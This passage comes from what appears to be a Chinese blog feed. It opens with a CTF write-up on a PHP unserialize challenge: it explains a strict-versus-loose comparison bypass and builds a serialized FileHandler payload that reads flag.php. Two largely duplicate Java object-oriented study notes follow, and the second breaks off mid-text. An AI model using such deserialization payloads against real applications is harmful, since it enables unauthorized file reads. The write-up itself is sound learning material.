class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="代码执行过程"><a href="#代码执行过程" class="headerlink" title="代码执行过程"></a>代码执行过程</h4><p>我们根据代码，将代码执行过程捋一遍。</p><ol><li><p>get方式传入参数str</p></li><li><p>调用过滤方法</p></li><li><p>反序列化，调用析构方法。</p></li><li><p>调用process，根据op调用write或read。</p></li></ol><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>我们需要flag，所以尽量调用read方法。而read方法需要op=2。因而，我们需要设置op为2，但是在析构方法中有这么一条语句，如果op=2会将op强制转化为1。但是，他是强等于，而process中的对比为弱类型对比，这就产生了漏洞。在强类型对比中 2 ！=== ‘2’，在弱类型对比中，2 == ‘2’，所以我们可以依次为思路进行获取flag。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// destruct</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token comment">// process</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'2'</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'violet'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag_s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag_s</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到反序列字符串</p><pre class="line-numbers language-none"><code class="language-none">O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;s:1:&quot;2&quot;;s:11:&quot;*filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;*content&quot;;s:6:&quot;violet&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是这里其实还是不对的，因为，$op,$filename,$content三个变量权限都是protected，而protected权限的变量在序列化的时会有%00*%00字符，%00字符的ASCII码为0，就无法通过上面的is_valid函数校验。</p><p>所以需要改为public权限，然后payload变为</p><pre class="line-numbers language-none"><code class="language-none">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:6:&quot;violet&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ctrl-u 查看源码即可获得flag。其实，最好结合php执行漏洞，但是这里最主要的还是学习反序列化，所以还是不使用了。</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>当使用protected时，将其序列化会存在’%00*%00’，而%00是不可见的，所以我们可以在构造exploit时，尽量使用urlencode进行编码。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">violet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java面向对象(上)</title>
      <link href="/2021/09/25/java-mian-xiang-dui-xiang-shang/"/>
      <url>/2021/09/25/java-mian-xiang-dui-xiang-shang/</url>
      
        <content type="html"><![CDATA[<h2 id="类与对象的概述"><a href="#类与对象的概述" class="headerlink" title="类与对象的概述"></a>类与对象的概述</h2><h3 id="三条主线"><a href="#三条主线" class="headerlink" title="三条主线"></a>三条主线</h3><ol><li>Java类以及类的成员、属性、方法、构造器、代码块、内部类</li><li>面向对象的三大特征：封装性，继承性、多态性（抽象性）</li><li>关键字的使用：this、super、static、final、abstract、interface、package、import。。。。</li></ol><p>Java面向对象的学习主要根据这个主线</p><h3 id="面向对象与面向过程"><a href="#面向对象与面向过程" class="headerlink" title="面向对象与面向过程"></a>面向对象与面向过程</h3><ol><li><p>面向工程: 强调功能行为,以函数为最小单位,考虑怎么做<br>(1) 打开冰箱门<br>(2) 把大象装入冰箱<br>(3) 观赏冰箱门</p></li><li><p>面向对象: 强调具有功能的对想,一类/对象为最小单位,考虑谁来做.</p></li></ol><pre class="line-numbers language-none"><code class="language-none"> 人&#123;      打开(冰箱)&#123;          冰箱.开开()       &#125;      抬起(大象)&#123;          大象.进入(冰箱)&#125;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="完成一个项目的思路或者方法"><a href="#完成一个项目的思路或者方法" class="headerlink" title="完成一个项目的思路或者方法"></a>完成一个项目的思路或者方法</h3><ol><li><p>根据问题的需要，选择问题所针对的现实世界中的实体。</p></li><li><p>从实体中寻找解决问题相关的属性和功能，这写属性和功能就形成了概念世界中的类。</p></li><li><p>把抽象的实体用在计算机语言进行描述，形成计算机世界中类的定义。即借助某种程序语言，把类构成计算能够识别和处理的数据结构。</p></li><li><p>将类实例化城计算世界中的对象。对象是计算机世界中解决问题的最终工具。</p></li></ol><h4 id="大象将冰箱"><a href="#大象将冰箱" class="headerlink" title="大象将冰箱"></a>大象将冰箱</h4><ol><li><p>现实世界中的实体：大象、冰箱和人。</p></li><li><p>概念世界中的类：</p></li></ol><pre class="line-numbers language-none"><code class="language-none">大象：10wkg，10m，会跑。冰箱：1000L容量，有两个门。能装东西人：臂力。打开冰箱门，将大象装入冰箱，关门<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>类的定义：</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Elephant</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> weight <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> height <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Refrigerator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    这里不具体写了，懂意思就行<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  这里不具体写了，懂意思就行<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>类的实例化。Person p = new Person();</li></ol><h3 id="面向对象中两个重要的概念"><a href="#面向对象中两个重要的概念" class="headerlink" title="面向对象中两个重要的概念"></a>面向对象中两个重要的概念</h3><p>类： 是对一类事务的描述、是抽象的、概念上的定义</p><p>对象： 是是实际存在的事物的每个个体，因而也被成为实例（instance）<br>  （1）面向对象程序设计的重点是类的设计<br>  （2）设计类的成员</p><h3 id="面向对象思想落地实现规则"><a href="#面向对象思想落地实现规则" class="headerlink" title="面向对象思想落地实现规则"></a>面向对象思想落地实现规则</h3><p>1.创建类、设计类的成员</p><p>2.创建对的对象</p><p>3.通过”对象.属性“或者”对象.方法“调用对象的结构。</p><h4 id="几个概念的使用说明"><a href="#几个概念的使用说明" class="headerlink" title="几个概念的使用说明"></a>几个概念的使用说明</h4><p>属性：成员变量 = field = 域、字段</p><p>行为：方法  = method = 函数</p><p>创建类的对象：类的实例化 = 实例化类</p><h3 id="对象的创建与对象的内存解析"><a href="#对象的创建与对象的内存解析" class="headerlink" title="对象的创建与对象的内存解析"></a>对象的创建与对象的内存解析</h3><p>典型代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Person</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Person</span> p2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Person</span> p3 <span class="token operator">=</span> p1<span class="token punctuation">;</span>             <span class="token comment">//没有创建一个新的对象，与p1公用一个堆的对象实体。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="内存的解析"><a href="#内存的解析" class="headerlink" title="内存的解析"></a>内存的解析</h4><p>编译完源程序后，生成一个或多个字节码文件</p><p>我们使用JVM中的类的加载其和解释器对生成的字节码文件进行解释运行。意味着，需要将字节码文件对应的类加载到内存中，设计到内存解析<br>。即内存的解析出现在运行过程中。</p><h4 id="堆与栈"><a href="#堆与栈" class="headerlink" title="堆与栈"></a>堆与栈</h4><p>虚拟机栈，即为我们平时所说的栈结构。我们将局部变量储存在栈结构中。</p><p>堆，我们将new出的结构（比如数组、对象）加载在堆空间中。补充，对象的属性（非static）加载在堆空间中。</p><p>方法区：静态变量</p><h3 id="属性与局部变量"><a href="#属性与局部变量" class="headerlink" title="属性与局部变量"></a>属性与局部变量</h3><h4 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h4><ol><li>定义变量的格式: 数据类型 变量名 = 变量值</li><li>先声明后使用</li><li>变量都有其相应的作用域</li></ol><h4 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h4><ol><li><p>在类中声明的位置不同</p><p>属性:直接定义在类中的一对{}內<br>局部变量: 声明在方法內，方法形参、代码块内、构造器形参、构造器内部的参数</p></li><li><p>关于权限修饰符的不同</p><p>属性:可以在声明属性时:指明权限,使用权限修饰符<br>常使用的权限修饰符, privae, public, default,protected –&gt; 封装性</p><p>局部变量不可以</p></li><li><p>默认初始化值的使用</p><p>属性: 类的属性，根据类型，都有默认初始化值</p><pre><code>整型： 0浮点型： 0。0字符型： 0 &#39;\u0000&#39;引用数据类型: null布尔: false</code></pre><p>局部变量:</p><pre><code>没有默认初始化值，因此必须先初始化特别的，形参在调用时、我们赋值即可</code></pre></li><li><p>在内存中加载的位置不同</p><p>属性： 加载在堆空间（非static）</p><p>局部变量： 栈</p></li></ol><h3 id="变量分类的标准"><a href="#变量分类的标准" class="headerlink" title="变量分类的标准"></a>变量分类的标准</h3><ol><li>按照声明的类型</li></ol><p>  基本数据类型：</p><pre><code>数值型：整型（int，short，long）、浮点型（float，double）字符型（char）布尔型（boolen）</code></pre><p>  引用数据类型</p><pre><code>类（class）：字符串也是接口（interface）数组（[]）</code></pre><ol start="2"><li>按照声明的位置</li></ol><p>  成员变量：</p><pre><code>实例参数（不以static修饰）类变量（以static修饰）</code></pre><p>  局部变量：</p><pre><code>形参（方法、构造器中定义的变量）方法局部变量（在方法內定义）代码块局部变量（在代码块中定义）</code></pre><h3 id="匿名对象"><a href="#匿名对象" class="headerlink" title="匿名对象"></a>匿名对象</h3><ol><li>理解：我们创建的对象没有显示的赋给一个变量名。几位匿名对象</li><li>特征：匿名对象只能调用一此</li><li>使用如下</li></ol><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public class InstaceTest &#123;    public static void main(String[] args) &#123;        Phone p &#x3D; new Phone();        p.playgame();        &#x2F;&#x2F; 匿名对象        &#x2F;&#x2F; 每一次都会重新new，空间重新开辟        new Phone().sendEmail();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="万事万物皆对象"><a href="#万事万物皆对象" class="headerlink" title="万事万物皆对象"></a>万事万物皆对象</h3><p>简单的说我有很多对象（滑稽），我是个海王。</p><ol><li><p>在Java语言范畴中，我们都将功能、结构等封装到类中、通过类的实例化、来调用具体的功能结构</p></li><li><p>涉及到Java语言与前端HTML、后端数据库交互时，前后端的结构在Java层面交互时、都体现为类、对象。</p></li><li></li></ol><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><ol><li><p>方法的定义<br>方法: 描述类应该具有的功能<br>比如:Math类,sqrt(),random()<br>Scanner: nexInt()</p></li><li><p>方法的声明: 权限修饰符 返回值类型 方法名(形参列表){方法体}</p></li><li><p>说明:</p></li></ol><ul><li><p>关于权限修饰符:<br>Java规定的4中权限修饰符:private、public、缺省、protected      –&gt; 封装性细说</p></li><li><p>返回值类型:  有返回 无返回值</p><p>如果方法有返回值, 必须在方法声明时, 指定返回值的类型,。同时，在方法体中使用return关键字，返回指定的变量。</p><p>如果方法没有返回值，使用void即可。通常，没有返回值的方法中，就没必要使用return，范式，如果使用可以用作方法的结束</p><p>我们定义方法该不该有返回值？<br>(1) 题目要求：<br>(2) 看经验</p></li><li><p>方法名: 属于标识符，遵循标识符的规则和规范，”见名知意“；</p></li><li><p>参列表：可以规定0个、1个、多个形参</p><p>格式：数据类型1 形参1</p><p>我们定义方法时，该不该定义形参？</p></li></ul><p>   （1）题目要求<br>   （2）凭经验</p><ul><li>方法体：方法功能的体现</li></ul><ol start="4"><li><p>return 的使用：</p><p>1.作用范围： 使用在方法体中</p><p>2.作用：（1）结束方法（2）针对于有返回值类型那个的方法</p><p>3.注意： 后面不能有关键字</p></li><li><p>方法的使用中可以调用当前类的属性</p><p> 特殊的方法中调用方法，称为递归方法。</p><p> 方法中不可以定义方法。但可以调用</p></li></ol><h3 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>在一个类中，允许存在一个以上的同名方法，只要他们的参数个数或者参数类型不同即可</p><p>总结：“两同一不同”：同一个类，相同的参数名</p><p>  参数列表不同：参数的个数不同，参数类型不同</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public class MethodArgs &#123;    public static void main(String[] args) &#123;        MethodArgs m &#x3D; new MethodArgs();        m.show(&quot;hello&quot;,&quot;world&quot;);    &#125;    public void show(int i)&#123;    &#125;    public void show(String s)&#123;    &#125;    public void  show (String...strs)&#123;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="如何判断是否重载"><a href="#如何判断是否重载" class="headerlink" title="如何判断是否重载"></a>如何判断是否重载</h4><p>严格按照定义。</p><p>即两同一不同</p><p>和方法权限修饰符，方法体，形参名，返回值类型无关</p><h4 id="如何确定某一个方法的调用"><a href="#如何确定某一个方法的调用" class="headerlink" title="如何确定某一个方法的调用"></a>如何确定某一个方法的调用</h4><p>方法名==》参数列表</p><h4 id="可变形参的使用"><a href="#可变形参的使用" class="headerlink" title="可变形参的使用"></a>可变形参的使用</h4><p>具体的使用：</p><p>其实可以等价为数组。</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">Test t &#x3D; new Test();t.method(new String[]&#123;&quot;aa&quot;,&quot;bb&quot;&#125;)class Test&#123;public void method(String ... strs)&#123;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="递归方法"><a href="#递归方法" class="headerlink" title="递归方法"></a>递归方法</h3><p>方法调用自己的一种形式</p><h2 id="Java值传递机制"><a href="#Java值传递机制" class="headerlink" title="Java值传递机制"></a>Java值传递机制</h2><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p>如果变量是基本数据类型，此时赋值的是变量所保存的数据值</p><p>如果变量是引用数据类型，此时赋值的是变量所保存的数据地址值</p><h3 id="方法中参数的概念"><a href="#方法中参数的概念" class="headerlink" title="方法中参数的概念"></a>方法中参数的概念</h3><p>形参，方法定义时：声明的小括号内的参数</p><p>实参：方法调用时，实际传递给形参的值</p><h3 id="Java中参数传递机制：值传递"><a href="#Java中参数传递机制：值传递" class="headerlink" title="Java中参数传递机制：值传递"></a>Java中参数传递机制：值传递</h3><p>如果参数时基本数据类型，此时实参传递给形参的为实参真实储存的数据值。</p><p>如果参数是引用数据类型，此时实参赋给形参的是实参存储数据的地址值。</p><p>String的值传递很特殊。为啥我当时没想，String既然为引用数据类型，为什么没有使用new</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java面向对象(上)</title>
      <link href="/2021/09/25/java-mian-xiang-dui-xiang/"/>
      <url>/2021/09/25/java-mian-xiang-dui-xiang/</url>
      
        <content type="html"><![CDATA[<h2 id="类与对象的概述"><a href="#类与对象的概述" class="headerlink" title="类与对象的概述"></a>类与对象的概述</h2><h3 id="三条主线"><a href="#三条主线" class="headerlink" title="三条主线"></a>三条主线</h3><ol><li>Java类以及类的成员、属性、方法、构造器、代码块、内部类</li><li>面向对象的三大特征：封装性，继承性、多态性（抽象性）</li><li>关键字的使用：this、super、static、final、abstract、interface、package、import。。。。</li></ol><p>Java面向对象的学习主要根据这个主线</p><h3 id="面向对象与面向过程"><a href="#面向对象与面向过程" class="headerlink" title="面向对象与面向过程"></a>面向对象与面向过程</h3><ol><li><p>面向工程: 强调功能行为,以函数为最小单位,考虑怎么做<br>(1) 打开冰箱门<br>(2) 把大象装入冰箱<br>(3) 观赏冰箱门</p></li><li><p>面向对象: 强调具有功能的对想,一类/对象为最小单位,考虑谁来做.</p></li></ol><pre class="line-numbers language-none"><code class="language-none"> 人&#123;      打开(冰箱)&#123;          冰箱.开开()       &#125;      抬起(大象)&#123;          大象.进入(冰箱)&#125;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="完成一个项目的思路或者方法"><a href="#完成一个项目的思路或者方法" class="headerlink" title="完成一个项目的思路或者方法"></a>完成一个项目的思路或者方法</h3><ol><li><p>根据问题的需要，选择问题所针对的现实世界中的实体。</p></li><li><p>从实体中寻找解决问题相关的属性和功能，这写属性和功能就形成了概念世界中的类。</p></li><li><p>把抽象的实体用在计算机语言进行描述，形成计算机世界中类的定义。即借助某种程序语言，把类构成计算能够识别和处理的数据结构。</p></li><li><p>将类实例化城计算世界中的对象。对象是计算机世界中解决问题的最终工具。</p></li></ol><h4 id="大象将冰箱"><a href="#大象将冰箱" class="headerlink" title="大象将冰箱"></a>大象将冰箱</h4><ol><li><p>现实世界中的实体：大象、冰箱和人。</p></li><li><p>概念世界中的类：</p></li></ol><pre class="line-numbers language-none"><code class="language-none">大象：10wkg，10m，会跑。冰箱：1000L容量，有两个门。能装东西人：臂力。打开冰箱门，将大象装入冰箱，关门<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>类的定义：</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Elephant</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> weight <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> height <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Refrigerator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    这里不具体写了，懂意思就行<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  这里不具体写了，懂意思就行<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>类的实例化。Person p = new Person();</li></ol><h3 id="面向对象中两个重要的概念"><a href="#面向对象中两个重要的概念" class="headerlink" title="面向对象中两个重要的概念"></a>面向对象中两个重要的概念</h3><p>类： 是对一类事务的描述、是抽象的、概念上的定义</p><p>对象： 是是实际存在的事物的每个个体，因而也被成为实例（instance）<br>  （1）面向对象程序设计的重点是类的设计<br>  （2）设计类的成员</p><h3 id="面向对象思想落地实现规则"><a href="#面向对象思想落地实现规则" class="headerlink" title="面向对象思想落地实现规则"></a>面向对象思想落地实现规则</h3><p>1.创建类、设计类的成员</p><p>2.创建对的对象</p><p>3.通过”对象.属性“或者”对象.方法“调用对象的结构。</p><h4 id="几个概念的使用说明"><a href="#几个概念的使用说明" class="headerlink" title="几个概念的使用说明"></a>几个概念的使用说明</h4><p>属性：成员变量 = field = 域、字段</p><p>行为：方法  = method = 